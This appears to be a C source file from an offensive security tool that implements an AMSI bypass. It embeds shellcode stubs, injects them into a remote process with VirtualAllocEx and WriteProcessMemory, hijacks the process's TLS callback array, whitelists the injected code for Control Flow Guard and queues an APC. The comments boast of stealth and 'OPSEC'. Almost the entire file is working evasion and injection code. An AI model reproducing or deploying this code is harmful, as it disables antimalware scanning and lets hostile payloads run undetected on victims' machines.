#include "AMSIBypass.h"

// These are generated via xxd from the .bin files
UCHAR veh_bin[] = {                                                
  0x4c, 0x8b, 0x41, 0x08, 0x4c, 0x8b, 0x09, 0x41, 0x8b, 0x01, 0x3d, 0x03,
  0x00, 0x00, 0x80, 0x74, 0x0a, 0x3d, 0x04, 0x00, 0x00, 0x80, 0x74, 0x2c,
  0x31, 0xc0, 0xc3, 0x4c, 0x8d, 0x15, 0x7e, 0x00, 0x00, 0x00, 0x4d, 0x8b,  
  0x12, 0x4d, 0x89, 0x50, 0x48, 0x41, 0xc7, 0x40, 0x70, 0x01, 0x00, 0x00,  
  0x00, 0x41, 0x83, 0x48, 0x30, 0x10, 0x49, 0x83, 0x80, 0xf8, 0x00, 0x00,  
  0x00, 0x01, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xc3, 0x4d, 0x8b, 0x98, 0xf8,
  0x00, 0x00, 0x00, 0x4c, 0x8d, 0x15, 0x4e, 0x00, 0x00, 0x00, 0x4d, 0x8b,  
  0x12, 0x4d, 0x39, 0xd3, 0x75, 0x3d, 0x4d, 0x8b, 0x98, 0x98, 0x00, 0x00,  
  0x00, 0x4d, 0x8b, 0x63, 0x30, 0x4d, 0x85, 0xe4, 0x74, 0x08, 0x41, 0xc7,  
  0x04, 0x24, 0x01, 0x00, 0x00, 0x00, 0x41, 0xc7, 0x40, 0x68, 0x00, 0x00,
  0x00, 0x00, 0x4d, 0x8b, 0x13, 0x4d, 0x89, 0x90, 0xf8, 0x00, 0x00, 0x00,  
  0x49, 0x83, 0x80, 0x98, 0x00, 0x00, 0x00, 0x08, 0x41, 0x83, 0x48, 0x30,  
  0x10, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xc3, 0x31, 0xc0, 0xc3, 0x90, 0x90,  
  0x90, 0x90, 0x90, 0x90, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa
};
UINT veh_bin_len = 168;

UCHAR apc_bin[] = {
  0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x28, 0xb9, 0x01, 0x00, 0x00,
  0x00, 0x48, 0xba, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x48,
  0xb8, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd, 0xff, 0xd0, 0xcc,
  0x48, 0x83, 0xc4, 0x28, 0x5d, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
  0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c, 0x00
};
UINT apc_bin_len = 57;

UCHAR TLSCallback_bin[] = {
  0x83, 0xfa, 0x02, 0x75, 0x01, 0xcc, 0xc3
};
UINT TLSCallback_bin_len = 7;

PVOID ApplyTLSHijacking(HANDLE hProcess, HANDLE hThread, PVOID ImageBase) {
    printf("[*] Applying TLS Hijacking AMSI Bypass via VEH handler...\n");
    // The idea is to patch the first TLS callback of the process to point to our APC stub, which in turn will register our VEH handler and call it directly
    // This technique is really stealthy as it doesn't require any APC queuing or thread context manipulation, but it requires the target process to have a TLS directory with at least one callback (which is the case for powershell for example)

    PVOID pRemoteTLSCallback = WrapperVirtualAllocEx(hProcess, NULL, TLSCallback_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteTLSCallback) return FALSE;
    WrapperWriteProcessMemory(hProcess, pRemoteTLSCallback, TLSCallback_bin, TLSCallback_bin_len, NULL);
    WrapperVirtualProtectEx(hProcess, pRemoteTLSCallback, TLSCallback_bin_len, PAGE_EXECUTE_READ, NULL);

    //We Get the remote TLS directory
    IMAGE_DOS_HEADER dosHdr = {0};
    if (!WrapperReadProcessMemory(hProcess, ImageBase, &dosHdr, sizeof(IMAGE_DOS_HEADER), NULL)) return FALSE;

    PVOID pRemoteNtHdr = (PBYTE)ImageBase + dosHdr.e_lfanew;
    IMAGE_NT_HEADERS64 ntHdr = {0};
    if (!WrapperReadProcessMemory(hProcess, pRemoteNtHdr, &ntHdr, sizeof(IMAGE_NT_HEADERS64), NULL)) return FALSE;

    DWORD tlsRva = ntHdr.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    if (tlsRva == 0) {
        printf("[-] Target process has no TLS directory. TLS Hijacking aborted.\n");
        return FALSE; // Si pas de TLS, il faut utiliser Early Bird APC
    }

    PVOID pRemoteTlsDir = (PBYTE)ImageBase + tlsRva;
    IMAGE_TLS_DIRECTORY64 tlsDir = {0};
    if (!WrapperReadProcessMemory(hProcess, pRemoteTlsDir, &tlsDir, sizeof(IMAGE_TLS_DIRECTORY64), NULL)) return FALSE;
    
    PVOID pRemoteCallbacksArray = (PVOID)tlsDir.AddressOfCallBacks; // Is VA not RVA
    INT callbackCount = 0;
    PVOID tempPtr = NULL;
    
    while (TRUE) {
        // Read the table until we find a NULL entry
        if (!WrapperReadProcessMemory(
                hProcess, 
                (PBYTE)pRemoteCallbacksArray + (callbackCount * sizeof(PVOID)), 
                &tempPtr, 
                sizeof(PVOID), 
                NULL)) 
        {
            return FALSE; // Erreur de lecture
        }
        
        if (tempPtr == NULL) break;
        callbackCount++;
    }

    printf("[*] Found %d existing TLS callback(s).\n", callbackCount);

    SIZE_T newArraySize = (callbackCount + 2) * sizeof(PVOID); // +1 for our callback, +1 for the new NULL terminator
    PVOID* localNewArray = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newArraySize);
    //Copy existing Callback Arrays
    if (callbackCount > 0) {
        WrapperReadProcessMemory(hProcess, pRemoteCallbacksArray, localNewArray, callbackCount * sizeof(PVOID), NULL);
    }
    //Add our callback at the end of the array
    localNewArray[callbackCount] = pRemoteTLSCallback; // Our callback
    localNewArray[callbackCount + 1] = NULL; // New NULL terminator

    PVOID pRemoteNewArray = WrapperVirtualAllocEx(hProcess, NULL, newArraySize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteNewArray) {
        HeapFree(GetProcessHeap(), 0, localNewArray);
        return FALSE;
    }
    WrapperWriteProcessMemory(hProcess, pRemoteNewArray, localNewArray, newArraySize, NULL);
    HeapFree(GetProcessHeap(), 0, localNewArray);

    DWORD oldProtectArray;
    WrapperVirtualProtectEx(hProcess, pRemoteNewArray, newArraySize, PAGE_READONLY, &oldProtectArray);

    PVOID pRemoteAddressOfCallBacksField = (PBYTE)pRemoteTlsDir + offsetof(IMAGE_TLS_DIRECTORY64, AddressOfCallBacks);

    DWORD oldProtectHeader;
    if (!WrapperVirtualProtectEx(hProcess, pRemoteAddressOfCallBacksField, sizeof(PVOID), PAGE_READWRITE, &oldProtectHeader)) {
        printf("[-] Failed to unprotect PE header.\n");
        return FALSE;
    }

    WrapperWriteProcessMemory(hProcess, pRemoteAddressOfCallBacksField, &pRemoteNewArray, sizeof(PVOID), NULL);

    VirtualProtectEx(hProcess, pRemoteAddressOfCallBacksField, sizeof(PVOID), oldProtectHeader, &oldProtectHeader);

    printf("[+] TLS Hijacking successful! Shellcode will execute on ResumeThread.\n");

    return pRemoteTLSCallback;
}

// Helper function to scan the shellcode array and patch 8-byte placeholders
BOOL PatchPlaceholder(UCHAR* payload, SIZE_T payloadSize, ULONG64 placeholder, PVOID value) {
    for (SIZE_T i = 0; i <= payloadSize - sizeof(ULONG64); i++) {
        if (*(ULONG64*)(&payload[i]) == placeholder) {
            *(PVOID*)(&payload[i]) = value;
            return TRUE;
        }
    }
    return FALSE;
}

BOOL ApplyVehBypass(HANDLE hProcess, HANDLE hThread, PVOID ImageBase) {
    // 1. Resolve addresses locally.
    HMODULE hKernel32 = CustomGetModuleHandleW(L"kernel32.dll");
    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
    
    // Fallback if amsi.dll is not loaded in our process yet
    HMODULE hAmsi = CustomGetModuleHandleW(L"amsi.dll");
    if (!hAmsi) hAmsi = LoadLibraryA("amsi.dll"); 

    PVOID pLoadLibraryA = (PVOID)CustomGetProcAddress(hKernel32, "LoadLibraryA");
    PVOID pRtlAddVeh = (PVOID)CustomGetProcAddress(hNtdll, "RtlAddVectoredExceptionHandler");
    PVOID pAmsiScanBuffer = (PVOID)CustomGetProcAddress(hAmsi, "AmsiScanBuffer");

    if (!pLoadLibraryA || !pRtlAddVeh || !pAmsiScanBuffer) {
        printf("[-] Failed to resolve local API addresses.\n");
        return FALSE;
    }

    // --- HEAP ALLOCATION (CRT-Free) ---
    // We duplicate the stubs to the heap to avoid modifying the .rdata section if the stubs vars are put in the .rdata section
    HANDLE hHeap = GetProcessHeap();
    UCHAR* local_veh_bin = (UCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, veh_bin_len);
    UCHAR* local_apc_bin = (UCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, apc_bin_len);

    if (!local_veh_bin || !local_apc_bin) {
        if (local_veh_bin) HeapFree(hHeap, 0, local_veh_bin);
        if (local_apc_bin) HeapFree(hHeap, 0, local_apc_bin);
        return FALSE;
    }

    // CRT-Free memcpy alternative
    for (SIZE_T i = 0; i < veh_bin_len; i++) local_veh_bin[i] = veh_bin[i];
    for (SIZE_T i = 0; i < apc_bin_len; i++) local_apc_bin[i] = apc_bin[i];


    // 2. Patch VEH Stub Placeholder (Using the Heap copy)
    if (!PatchPlaceholder(local_veh_bin, veh_bin_len, 0xAAAAAAAAAAAAAAAA, pAmsiScanBuffer)) {
        printf("[-] Failed to patch AmsiScanBuffer address in VEH stub.\n");
        HeapFree(hHeap, 0, local_veh_bin);
        HeapFree(hHeap, 0, local_apc_bin);
        return FALSE;
    }

    // 3. Allocate and write VEH Stub (RW -> RX for OPSEC hehe)
    PVOID pRemoteVeh = WrapperVirtualAllocEx(hProcess, NULL, veh_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteVeh) goto cleanup; // Goto used for clean heap freeing

    WrapperWriteProcessMemory(hProcess, pRemoteVeh, local_veh_bin, veh_bin_len, NULL);
    
    DWORD oldProtect;
    WrapperVirtualProtectEx(hProcess, pRemoteVeh, veh_bin_len, PAGE_EXECUTE_READ, &oldProtect);

    // 4. Patch APC Stub Placeholders (Using the Heap copy)
    PatchPlaceholder(local_apc_bin, apc_bin_len, 0xBBBBBBBBBBBBBBBB, pLoadLibraryA);
    PatchPlaceholder(local_apc_bin, apc_bin_len, 0xCCCCCCCCCCCCCCCC, pRemoteVeh);
    PatchPlaceholder(local_apc_bin, apc_bin_len, 0xDDDDDDDDDDDDDDDD, pRtlAddVeh);

    // 5. Allocate and write APC Stub
    PVOID pRemoteApc = WrapperVirtualAllocEx(hProcess, NULL, apc_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteApc) goto cleanup;

    WrapperWriteProcessMemory(hProcess, pRemoteApc, local_apc_bin, apc_bin_len, NULL);
    WrapperVirtualProtectEx(hProcess, pRemoteApc, apc_bin_len, PAGE_EXECUTE_READ, &oldProtect);

    printf("[+] VEH Handler setup at: 0x%p\n", pRemoteVeh);
    printf("[+] APC Stub setup at: 0x%p\n", pRemoteApc);
    printf("[+] Using TLS Callbacks to trigger VEH on thread creation.\n");

    PVOID pRemoteTLSCallbackStub = ApplyTLSHijacking(hProcess, hThread, ImageBase);

    // --- CFG WHITELISTING ---
    printf("[*] Whitelisting the APC stub, TLS Callback & VEH for CFG\n");
    typedef BOOL (WINAPI * SetProcessValidCallTargets_t)(HANDLE, PVOID, SIZE_T, ULONG, PCFG_CALL_TARGET_INFO);
    SetProcessValidCallTargets_t pSetProcessValidCallTargets = (SetProcessValidCallTargets_t)CustomGetProcAddress(CustomGetModuleHandleW(L"kernelbase.dll"), "SetProcessValidCallTargets");

    if (pSetProcessValidCallTargets) {
        CFG_CALL_TARGET_INFO cfgInfo = {0};
        cfgInfo.Offset = 0; 
        cfgInfo.Flags = CFG_CALL_TARGET_VALID; // Mandatory flag

        pSetProcessValidCallTargets(hProcess, pRemoteTLSCallbackStub, TLSCallback_bin_len, 1, &cfgInfo);
        pSetProcessValidCallTargets(hProcess, pRemoteApc, apc_bin_len, 1, &cfgInfo);
        pSetProcessValidCallTargets(hProcess, pRemoteVeh, veh_bin_len, 1, &cfgInfo);
    }

    // 6. Queue the APC to the target thread
    if (!WrapperQueueUserAPC((PAPCFUNC)pRemoteApc, hThread, 0)) {
        printf("[-] Failed to queue APC.\n");
        goto cleanup;
    }

    printf("[+] APC queued successfully.\n");

    // Clean execution flow ends here, free memory and return TRUE
    HeapFree(hHeap, 0, local_veh_bin);
    HeapFree(hHeap, 0, local_apc_bin);
    return TRUE;

cleanup:
    // Error execution flow ends here
    HeapFree(hHeap, 0, local_veh_bin);
    HeapFree(hHeap, 0, local_apc_bin);
    return FALSE;
}